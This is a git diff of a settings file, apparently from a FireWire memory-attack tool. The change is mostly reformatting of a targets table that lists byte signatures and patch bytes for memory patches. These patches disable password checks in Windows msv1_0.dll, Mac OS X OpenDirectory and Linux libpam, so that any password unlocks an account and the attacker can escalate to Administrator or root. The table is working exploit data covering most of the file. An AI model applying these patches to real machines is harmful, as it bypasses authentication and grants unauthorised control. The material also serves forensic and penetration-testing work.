@@ -21,6 +21,7 @@ Created on Sep 6, 2011
 
 @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
 '''
+#pylint: disable-msg=C0103,C0301
 from textwrap import TextWrapper
 
 #===============================================================================
@@ -37,11 +38,12 @@ wrapper = TextWrapper(subsequent_indent = ' ' * 4)
 #===============================================================================
 # Constants
 #===============================================================================
+DEBUG = 0                           # Debug off
 KiB = 1024                          # One KibiByte
 MiB = 1024 * KiB                    # One MebiByte
 GiB = 1024 * MiB                    # One GibiByte
 PAGESIZE = 4 * KiB                  # For the sake of this tool, always the case
-OUICONF = 'data/oui.txt'            # FireWire OUI database relative to package
+OUICONF = 'resources/oui.txt'       # FireWire OUI database relative to package
 LINUX = 'Linux'
 OSX = 'Darwin'
 WINDOWS = 'Windows'
@@ -143,143 +145,143 @@ termwidth = 80                  # Default terminal size is 80 chars wide
 #
 #===============================================================================
 
-targets=[{'OS': 'Windows 8',
-          'versions': ['SP0'],
-          'architectures': ['x86', 'x64'],
-          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
-          'notes': 'Ensures that the password-check always returns true. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
-          'signatures': [{'offsets': [0xde7], # x86 SP0 
-                          'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xb001, # mov al,1
-                                      'patchoffset': 0xc1}]},
-                         {'offsets': [0x208], # x64 SP0
-                          'chunks': [{'chunk': 0xc60f85,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x909090909090,
-                                      'patchoffset': 0x01},
-                                     {'chunk': 0x66b80100,
-                                      'internaloffset': 0x07}]}]},
-         {'OS': 'Windows 7',
-          'versions': ['SP0', 'SP1'],
-          'architectures': ['x86', 'x64'],
-          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
-          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
-          'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], # x64 SP0-SP1
-                          'chunks': [{'chunk': 0xc60f85,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x909090909090,
-                                      'patchoffset': 0x01},
-                                     {'chunk': 0xb8,
-                                      'internaloffset': 0x07}]},
-                         {'offsets': [0x926], # x86 SP0
-                          'chunks': [{'chunk': 0x83f8107513b0018b,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x83f8109090b0018b,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0x312], # x86 SP1
-                          'chunks': [{'chunk': 0x83f8100f8550940000b0018b,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x83f810909090909090b0018b,
-                                      'patchoffset': 0x00}]}]},
-         {'OS': 'Windows Vista',
-          'versions': ['SP0', 'SP2'],
-          'architectures': ['x86', 'x64'],
-          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
-          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
-          'signatures': [{'offsets': [0x1a1], # x64 SP2
-                          'chunks': [{'chunk': 0xc60f85,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x909090909090,
-                                      'patchoffset': 0x01},
-                                     {'chunk': 0xb8,
-                                      'internaloffset': 0x07}]},
-                         {'offsets': [0x432, 0x80f, 0x74a], # SP0, SP1, SP2 x86
-                          'chunks': [{'chunk': 0x83f8107513b0018b,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x83f8109090b0018b,
-                                      'patchoffset': 0x00}]}]},
-         {'OS': 'Windows XP',
-          'versions': ['SP2', 'SP3'],
-          'architectures': ['x86'],
-          'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
-          'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
-          'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6], # SP2-3 x86
-                          'chunks': [{'chunk': 0x83f8107511b0018b,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x83f8109090b0018b,
-                                      'patchoffset': 0x00}]}]},
-         {'OS': 'Mac OS X',
-          'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2'],
-          'architectures': ['x86', 'x64'],
-          'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
-          'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
-          'signatures': [{'offsets': [0x7cf], # 10.6.4 x64
-                          'chunks': [{'chunk': 0x41bff6c8ffff48c78588,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x41bf0000000048c78588,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0xbff], # 10.6.8 x64
-                          'chunks': [{'chunk': 0x41bff6c8ffff,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x41bf00000000,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0x82f], # 10.6.8 x32
-                          'chunks': [{'chunk': 0xc78580f6fffff6c8ffff,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xc78580f6ffff00000000,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0xfa7], # 10.7.3 x64
-                          'chunks': [{'chunk': 0x0fb6,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x31dbffc3, # xor ebx,ebx; inc ebx;
-                                      'patchoffset': 0x00},
-                                     {'chunk': 0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
-                                      'internaloffset': 0x0e}]},
-                         {'offsets': [0x334], # 10.8.2 x64
-                          'chunks': [{'chunk': 0x88d84883c4685b415c415d415e415f5d,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xb001, # mov al,1;
-                                      'patchoffset': 0x00}]}]},
-         {'OS': 'Ubuntu',
-          'versions': ['11.04','11.10','12.04','12.10'],
-          'architectures': ['x86', 'x64'],
-          'name': 'libpam unlock/privilege escalation',
-          'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
-          'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
-                          'chunks': [{'chunk': 0x83f81f89c774,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xbf00000000eb,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0xb46], # 12.10 x86
-                          'chunks': [{'chunk': 0xe8f505000083f81f,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x9031c0, # nop; xor eax,eax
-                                      'patchoffset': 0x05}]},
-                         {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
-                          'chunks': [{'chunk': 0x83f81f89c574,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xbd00000000eb,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0x4aa], # 12.10 x64
-                          'chunks': [{'chunk': 0xe80105000083f81f,
-                                      'internaloffset': 0x00,
-                                      'patch': 0x6631c0, # xor eax,eax
-                                      'patchoffset': 0x05}]}]},
-         {'OS': 'Linux Mint',
-          'versions': ['11','12','13'],
-          'architectures': ['x86', 'x64'],
-          'name': 'libpam unlock/privilege escalation',
-          'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
-          'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
-                          'chunks': [{'chunk': 0x83f81f89c774,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xbf00000000eb,
-                                      'patchoffset': 0x00}]},
-                         {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
-                          'chunks': [{'chunk': 0x83f81f89c574,
-                                      'internaloffset': 0x00,
-                                      'patch': 0xbd00000000eb,
-                                      'patchoffset': 0x00}]}]}]
+targets = [{'OS': 'Windows 8',
+            'versions': ['SP0'],
+            'architectures': ['x86', 'x64'],
+            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
+            'notes': 'Ensures that the password-check always returns true. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command.',
+            'signatures': [{'offsets': [0xde7], # x86 SP0 
+                            'chunks': [{'chunk': 0x8bff558bec81ec90000000a1,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xb001, # mov al,1
+                                        'patchoffset': 0xc1}]},
+                           {'offsets': [0x208], # x64 SP0
+                            'chunks': [{'chunk': 0xc60f85,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x909090909090,
+                                        'patchoffset': 0x01},
+                                       {'chunk': 0x66b80100,
+                                        'internaloffset': 0x07}]}]},
+           {'OS': 'Windows 7',
+            'versions': ['SP0', 'SP1'],
+            'architectures': ['x86', 'x64'],
+            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
+            'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
+            'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291, 0x321], # x64 SP0-SP1
+                            'chunks': [{'chunk': 0xc60f85,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x909090909090,
+                                        'patchoffset': 0x01},
+                                       {'chunk': 0xb8,
+                                        'internaloffset': 0x07}]},
+                           {'offsets': [0x926], # x86 SP0
+                            'chunks': [{'chunk': 0x83f8107513b0018b,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x83f8109090b0018b,
+                                        'patchoffset': 0x00}]},
+                           {'offsets': [0x312], # x86 SP1
+                            'chunks': [{'chunk': 0x83f8100f8550940000b0018b,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x83f810909090909090b0018b,
+                                        'patchoffset': 0x00}]}]},
+           {'OS': 'Windows Vista',
+            'versions': ['SP0', 'SP2'],
+            'architectures': ['x86', 'x64'],
+            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
+            'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
+            'signatures': [{'offsets': [0x1a1], # x64 SP2
+                            'chunks': [{'chunk': 0xc60f85,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x909090909090,
+                                        'patchoffset': 0x01},
+                                       {'chunk': 0xb8,
+                                        'internaloffset': 0x07}]},
+                           {'offsets': [0x432, 0x80f, 0x74a], # SP0, SP1, SP2 x86
+                            'chunks': [{'chunk': 0x83f8107513b0018b,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x83f8109090b0018b,
+                                        'patchoffset': 0x00}]}]},
+           {'OS': 'Windows XP',
+            'versions': ['SP2', 'SP3'],
+            'architectures': ['x86'],
+            'name': 'msv1_0.dll MsvpPasswordValidate unlock/privilege escalation',
+            'notes': 'NOPs out the jump that is called if passwords doesn\'t match. This will cause all accounts to no longer require a password, and will also allow you to escalate privileges to Administrator via the \'runas\' command. Note: As the patch stores the LANMAN/NTLM hash of the entered password, the account will be locked out of any Windows AD domain he/she was member of at this machine.',
+            'signatures': [{'offsets': [0x862, 0x8aa, 0x946, 0x126, 0x9b6], # SP2-3 x86
+                            'chunks': [{'chunk': 0x83f8107511b0018b,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x83f8109090b0018b,
+                                        'patchoffset': 0x00}]}]},
+           {'OS': 'Mac OS X',
+            'versions': ['10.6.4', '10.6.8', '10.7.3', '10.8.2'],
+            'architectures': ['x86', 'x64'],
+            'name': 'DirectoryService/OpenDirectory unlock/privilege escalation',
+            'notes': 'Overwrites DoShadowHashAuth/ODRecordVerifyPassword return value. After running, all local authentications (e.g., GUI, sudo, etc.) will work with all non-blank passwords',
+            'signatures': [{'offsets': [0x7cf], # 10.6.4 x64
+                            'chunks': [{'chunk': 0x41bff6c8ffff48c78588,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x41bf0000000048c78588,
+                                        'patchoffset': 0x00}]},
+                           {'offsets': [0xbff], # 10.6.8 x64
+                            'chunks': [{'chunk': 0x41bff6c8ffff,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x41bf00000000,
+                                        'patchoffset': 0x00}]},
+                           {'offsets': [0x82f], # 10.6.8 x32
+                            'chunks': [{'chunk': 0xc78580f6fffff6c8ffff,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xc78580f6ffff00000000,
+                                        'patchoffset': 0x00}]},
+                           {'offsets': [0xfa7], # 10.7.3 x64
+                            'chunks': [{'chunk': 0x0fb6,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x31dbffc3, # xor ebx,ebx; inc ebx;
+                                        'patchoffset': 0x00},
+                                       {'chunk': 0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
+                                        'internaloffset': 0x0e}]},
+                           {'offsets': [0x334], # 10.8.2 x64
+                            'chunks': [{'chunk': 0x88d84883c4685b415c415d415e415f5d,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xb001, # mov al,1;
+                                        'patchoffset': 0x00}]}]},
+           {'OS': 'Ubuntu',
+            'versions': ['11.04','11.10','12.04','12.10'],
+            'architectures': ['x86', 'x64'],
+            'name': 'libpam unlock/privilege escalation',
+            'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
+            'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
+                            'chunks': [{'chunk': 0x83f81f89c774,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xbf00000000eb,
+                                        'patchoffset': 0x00}]},
+                           {'offsets': [0xb46], # 12.10 x86
+                            'chunks': [{'chunk': 0xe8f505000083f81f,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x9031c0, # nop; xor eax,eax
+                                        'patchoffset': 0x05}]},
+                           {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
+                            'chunks': [{'chunk': 0x83f81f89c574,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xbd00000000eb,
+                                        'patchoffset': 0x00}]},
+                           {'offsets': [0x4aa], # 12.10 x64
+                            'chunks': [{'chunk': 0xe80105000083f81f,
+                                        'internaloffset': 0x00,
+                                        'patch': 0x6631c0, # xor eax,eax
+                                        'patchoffset': 0x05}]}]},
+           {'OS': 'Linux Mint',
+            'versions': ['11','12','13'],
+            'architectures': ['x86', 'x64'],
+            'name': 'libpam unlock/privilege escalation',
+            'notes': 'Overwrites pam_authenticate return value. After running, all PAM-based authentications (e.g., GUI, tty and sudo) will work with no password.',
+            'signatures': [{'offsets': [0xebd, 0xbaf, 0xa7f], # 11.10, 11.04, 12.04 x86
+                            'chunks': [{'chunk': 0x83f81f89c774,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xbf00000000eb,
+                                        'patchoffset': 0x00}]},
+                           {'offsets': [0x838, 0x5b8, 0x3c8], # 11.10, 11.04, 12.04 x64
+                            'chunks': [{'chunk': 0x83f81f89c574,
+                                        'internaloffset': 0x00,
+                                        'patch': 0xbd00000000eb,
+                                        'patchoffset': 0x00}]}]}]
 
 egg = False
